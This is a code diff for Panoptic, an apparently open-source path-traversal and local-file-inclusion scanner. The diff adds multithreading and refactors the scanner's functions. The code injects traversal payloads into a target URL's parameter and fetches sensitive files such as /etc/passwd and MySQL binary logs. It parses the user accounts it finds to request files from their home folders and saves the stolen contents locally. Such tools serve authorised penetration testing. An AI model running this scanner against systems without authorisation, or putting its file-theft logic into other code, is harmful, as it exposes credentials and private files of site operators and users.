@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+from __future__ import print_function
 
 """
 Copyright (c) 2013 Roberto Christopher Salgado Bjerre, Miroslav Stampar.
@@ -34,6 +35,7 @@ import random
 import re
 import string
 import sys
+import threading
 import time
 import xml.etree.ElementTree as ET
 
@@ -103,6 +105,13 @@ class _(dict):
 
 # Knowledge base used for storing program wide settings
 kb = _()
+
+# Variable used to store command parsed arguments
+args = None
+
+def print(*args, **kwargs):
+    with kb.print_lock:
+        return __builtins__.print(*args, **kwargs)
 
 def get_cases(args):
     """
@@ -251,11 +260,175 @@ def ask_question(question, default=None, automatic=False):
         answer = default
         print("%s%s" % (question, answer))
     else:
-        answer = raw_input(question)
+        with kb.print_lock:
+            answer = raw_input(question)
 
     print
 
     return answer
+
+def prepare_request(payload):
+    """
+    Prepares HTTP (GET or POST) request with proper payload
+    """
+
+    _ = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
+                            r"\1=%s" % payload, kb.request_params)
+
+    request_args = {"url": "%s://%s%s" % (kb.parsed_target_url.scheme or "http", kb.parsed_target_url.netloc, kb.parsed_target_url.path)}
+
+    if args.data:
+        request_args["data"] = _
+    else:
+        request_args["url"] += "?%s" % _
+
+    if args.header:
+        request_args["header"] = args.header
+
+    if args.cookie:
+        request_args["cookie"] = args.cookie
+
+    if args.user_agent:
+        request_args["user_agent"] = args.user_agent
+
+    request_args["verbose"] = args.verbose
+
+    return request_args
+
+def clean_response(response, filepath):
+    """
+    Cleans response from occurrences of filepath
+    """
+
+    response = response.replace(filepath, "")
+    regex = re.sub(r"[^A-Za-z0-9]", "(.|&\w+;|%[0-9A-Fa-f]{2})", filepath)
+
+    return re.sub(regex, "", response, re.I)
+
+def request_file(case, replace_slashes=True):
+    """
+    Requests target for a file described in case
+    """
+
+    global ROTATOR_CHARS
+
+    if args.replace_slash and replace_slashes:
+        case["location"] = case["location"].replace("/", args.replace_slash.replace("\\", "\\\\"))
+
+    if kb.restrict_os and kb.restrict_os != case["os"]:
+        if args.verbose:
+            print("[*] Skipping '%s'" % case["location"])
+
+        return None
+
+    if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
+        args.prefix = args.prefix[:-1]
+
+    if args.verbose:
+        print("[*] Trying '%s'" % case["location"])
+    else:
+        with kb.print_lock:
+            sys.stdout.write("\r%s\r" % ROTATOR_CHARS[0])
+            sys.stdout.flush()
+
+    ROTATOR_CHARS = ROTATOR_CHARS[1:] + ROTATOR_CHARS[0]
+
+    request_args = prepare_request("%s%s%s" % (args.prefix, case["location"], args.postfix))
+    html = get_page(**request_args)
+
+    if not html or args.bad_string and html.find(args.bad_string) != -1:
+        return None
+
+    matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(kb.invalid_response, INVALID_FILENAME))
+
+    if matcher.quick_ratio() < HEURISTIC_RATIO:
+        with kb.value_lock:
+            if not kb.found:
+                print("[i] Possible file(s) found!")
+                print("[i] OS: %s" % case["os"])
+
+                if kb.restrict_os is None:
+                    answer = ask_question("Do you want to restrict further scans to '%s'? [Y/n]" % case["os"], default='Y', automatic=args.automatic)
+                    kb.restrict_os = answer.upper() != 'N' and case["os"]
+
+        _ = "'%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"])
+        _ = _.replace("%s/%s/" % (case["os"], case["os"]), "%s/" % case["os"])
+
+        print("[+] Found %s" % _)
+
+        if args.verbose:
+            kb.files.append(_)
+
+        # If --write-file is set
+        if args.write_files:
+            _ = os.path.join("output", kb.parsed_target_url.netloc)
+
+            if not os.path.exists(_):
+                os.makedirs(_)
+
+            with open(os.path.join(_, "%s.txt" % case["location"].replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
+                content = html
+
+                with kb.value_lock:
+                    if kb.filter_output is None:
+                        answer = ask_question("Do you want to filter retrieved files from original HTML page content? [Y/n]", default='Y', automatic=args.automatic)
+                        kb.filter_output = answer.upper() != 'N'
+
+                if kb.get("filter_output"):
+                    matcher = difflib.SequenceMatcher(None, html, original_response)
+                    matching_blocks = matcher.get_matching_blocks()
+
+                    if matching_blocks:
+                        start = matching_blocks[0]
+                        if start[0] == start[1] == 0 and start[2] > 0:
+                            content = content[start[2]:]
+                        if len(matching_blocks) > 2:
+                            end = matching_blocks[-2]
+                            if end[2] > 0 and end[0] + end[2] == len(html) and end[1] + end[2] == len(original_response):
+                                content = content[:-end[2]]
+
+                f.write(content)
+
+        return html
+
+    return None
+
+def try_cases(cases):
+    for case in cases:
+        html = request_file(case)
+
+        if html is None:
+            continue
+        if not kb.found:
+            kb.found = True
+
+        # If --skip-file-parsing is not set.
+        if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
+            users = re.finditer("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
+
+            if args.verbose:
+                print("[*] Extracting home folders from '%s'" % case["location"])
+
+            for user in users:
+                if args.verbose:
+                    print("[*] User: %s, Info: %s" % (user.group("username"), user.group("info")))
+                if not kb.home_files:
+                    with open(HOME_FILES_FILE, "r") as f:
+                        kb.home_files = filter(None, (_.strip() for _ in f.readlines()))
+                for _ in kb.home_files:
+                    if user.group("home") == "/":
+                        continue
+                    request_file({"category": "*NIX User File", "type": "conf", "os": case["os"], "location": "%s/%s" % (user.group("home"), _), "software": "*NIX"})
+
+        if "mysql-bin.index" in case["location"] and not args.skip_parsing:
+            binlogs = re.findall("\\.\\\\(?P<binlog>mysql-bin\\.\\d{0,6})", html)
+            location = case["location"].rfind("/") + 1
+
+            if args.verbose:
+                print("[i] Extracting MySQL binary logs from '%s'" % case["location"])
+
+            for _ in binlogs:
+                request_file({"category": "Databases", "type": "log", "os": case["os"], "location": "%s%s" % (case["location"][:location], _), "software": "MySQL"}, False)
 
 def parse_args():
     """
@@ -328,13 +501,16 @@ def parse_args():
                 help="set postfix for file path (e.g. \"%00\")")
 
     parser.add_option("--multiplier", dest="multiplier", type="int", default=1,
-                help="set multiplication number for prefix (e.g. 10)")
+                help="set multiplication number for prefix (default: 1)")
 
     parser.add_option("--bad-string", dest="bad_string", metavar="STRING",
                 help="set a string occurring when file is not found")
 
     parser.add_option("--replace-slash", dest="replace_slash",
                 help="set replacement for char / in paths (e.g. \"/././\")")
+
+    parser.add_option("--threads", dest="threads", type="int", default=1,
+                help="set number of threads (default: 1)")
 
     parser.add_option("--update", dest="update", action="store_true",
                 help="update Panoptic from official repository")
@@ -364,13 +540,18 @@ def main():
     Initializes and executes the program
     """
 
+    global args
+
+    kb.files = []
+    kb.found = False
+    kb.print_lock = threading.Lock()
+    kb.value_lock = threading.Lock()
+
     check_revision()
 
     print(BANNER)
 
     args = parse_args()
-    found = False
-    files = []
 
     if args.update:
         update()
@@ -418,11 +599,11 @@ def main():
         with open(USER_AGENTS_FILE, 'r') as f:
             args.user_agent = random.sample(f.readlines(), 1)[0]
 
-    parsed_url = urlsplit(args.url)
-    request_params = args.data if args.data else parsed_url.query
+    kb.parsed_target_url = urlsplit(args.url)
+    kb.request_params = args.data if args.data else kb.parsed_target_url.query
 
     if not args.param:
-        match = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params)
+        match = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", kb.request_params)
         if match:
             args.param = match.group("param")
         else:
@@ -433,45 +614,6 @@ def main():
         kb.restrict_os = args.os
 
     print("[i] Starting scan at: %s\n" % time.strftime("%X"))
-
-    def prepare_request(payload):
-        """
-        Prepares HTTP (GET or POST) request with proper payload
-        """
-
-        _ = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
-                                r"\1=%s" % payload, request_params)
-
-        request_args = {"url": "%s://%s%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path)}
-
-        if args.data:
-            request_args["data"] = _
-        else:
-            request_args["url"] += "?%s" % _
-
-        if args.header:
-            request_args["header"] = args.header
-
-        if args.cookie:
-            request_args["cookie"] = args.cookie
-
-        if args.user_agent:
-            request_args["user_agent"] = args.user_agent
-
-        request_args["verbose"] = args.verbose
-
-        return request_args
-
-    def clean_response(response, filepath):
-        """
-        Cleans response from occurrences of filepath
-        """
-
-        response = response.replace(filepath, "")
-        regex = re.sub(r"[^A-Za-z0-9]", "(.|&\w+;|%[0-9A-Fa-f]{2})", filepath)
-
-        return re.sub(regex, "", response, re.I)
-
     print("[i] Checking original response...")
 
     request_args = prepare_request(None)
@@ -485,141 +627,34 @@ def main():
     print("[i] Checking invalid response...")
 
     request_args = prepare_request(INVALID_FILENAME)
-    invalid_response = get_page(**request_args)
+    kb.invalid_response = get_page(**request_args)
 
     print("[i] Done!")
     print("[i] Searching for files...")
 
-    def request_file(case, replace_slashes=True):
-        """
-        Requests target for a file described in case
-        """
+    threads = []
+    for i in xrange(args.threads):
+        thread = threading.Thread(target=try_cases, args=([cases[_] for _ in xrange(i, len(cases), args.threads)],))
+        thread.daemon = True
+        thread.start()
+        threads.append(thread)
 
-        global ROTATOR_CHARS
+    alive = True
+    while alive:
+        alive = False
+        for thread in threads:
+            if thread.isAlive():
+                alive = True
+                time.sleep(0.1)
 
-        if args.replace_slash and replace_slashes:
-            case["location"] = case["location"].replace("/", args.replace_slash.replace("\\", "\\\\"))
-
-        if kb.restrict_os and kb.restrict_os != case["os"]:
-            if args.verbose:
-                print("[*] Skipping '%s'" % case["location"])
-
-            return None
-
-        if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
-            args.prefix = args.prefix[:-1]
-
-        if args.verbose:
-            print("[*] Trying '%s'" % case["location"])
-        else:
-            sys.stdout.write("\r%s\r" % ROTATOR_CHARS[0])
-            sys.stdout.flush()
-
-        ROTATOR_CHARS = ROTATOR_CHARS[1:] + ROTATOR_CHARS[0]
-
-        request_args = prepare_request("%s%s%s" % (args.prefix, case["location"], args.postfix))
-        html = get_page(**request_args)
-
-        if not html or args.bad_string and html.find(args.bad_string) != -1:
-            return None
-
-        matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(invalid_response, INVALID_FILENAME))
-
-        if matcher.quick_ratio() < HEURISTIC_RATIO:
-            if not found:
-                print("[i] Possible file(s) found!")
-                print("[i] OS: %s" % case["os"])
-
-                if kb.restrict_os is None:
-                    answer = ask_question("Do you want to restrict further scans to '%s'? [Y/n]" % case["os"], default='Y', automatic=args.automatic)
-                    kb.restrict_os = answer.upper() != 'N' and case["os"]
-
-            _ = "'%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"])
-            _ = _.replace("%s/%s/" % (case["os"], case["os"]), "%s/" % case["os"])
-
-            print("[+] Found %s" % _)
-
-            if args.verbose:
-                files.append(_)
-
-            # If --write-file is set
-            if args.write_files:
-                _ = os.path.join("output", parsed_url.netloc)
-
-                if not os.path.exists(_):
-                    os.makedirs(_)
-
-                with open(os.path.join(_, "%s.txt" % case["location"].replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
-                    content = html
-
-                    if kb.filter_output is None:
-                        answer = ask_question("Do you want to filter retrieved files from original HTML page content? [Y/n]", default='Y', automatic=args.automatic)
-                        kb.filter_output = answer.upper() != 'N'
-
-                    if kb.get("filter_output"):
-                        matcher = difflib.SequenceMatcher(None, html, original_response)
-                        matching_blocks = matcher.get_matching_blocks()
-
-                        if matching_blocks:
-                            start = matching_blocks[0]
-                            if start[0] == start[1] == 0 and start[2] > 0:
-                                content = content[start[2]:]
-                            if len(matching_blocks) > 2:
-                                end = matching_blocks[-2]
-                                if end[2] > 0 and end[0] + end[2] == len(html) and end[1] + end[2] == len(original_response):
-                                    content = content[:-end[2]]
-
-                    f.write(content)
-
-            return html
-
-        return None
-
-    # Test file locations in XML file
-    for case in cases:
-        html = request_file(case)
-
-        if html is None:
-            continue
-        if not found:
-            found = True
-
-        # If --skip-file-parsing is not set.
-        if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
-            users = re.finditer("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
-
-            if args.verbose:
-                print("[*] Extracting home folders from '%s'" % case["location"])
-
-            for user in users:
-                if args.verbose:
-                    print("[*] User: %s, Info: %s" % (user.group("username"), user.group("info")))
-                if not kb.home_files:
-                    with open(HOME_FILES_FILE, "r") as f:
-                        kb.home_files = filter(None, (_.strip() for _ in f.readlines()))
-                for _ in kb.home_files:
-                    if user.group("home") == "/":
-                        continue
-                    request_file({"category": "*NIX User File", "type": "conf", "os": case["os"], "location": "%s/%s" % (user.group("home"), _), "software": "*NIX"})
-
-        if "mysql-bin.index" in case["location"] and not args.skip_parsing:
-            binlogs = re.findall("\\.\\\\(?P<binlog>mysql-bin\\.\\d{0,6})", html)
-            location = case["location"].rfind("/") + 1
-
-            if args.verbose:
-                print("[i] Extracting MySQL binary logs from '%s'" % case["location"])
-
-            for _ in binlogs:
-                request_file({"category": "Databases", "type": "log", "os": case["os"], "location": "%s%s" % (case["location"][:location], _), "software": "MySQL"}, False)
-
-    if not found:
+    if not kb.found:
         print("[i] No files found!")
     elif args.verbose:
         print("\n[i] Files found:")
-        for _ in files:
+        for _ in kb.files:
             print("[o] %s" % _)
 
-    print("\n[i] File search complete.")
+    print("  \n[i] File search complete.")
     print("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))
 
 def get_page(**kwargs):
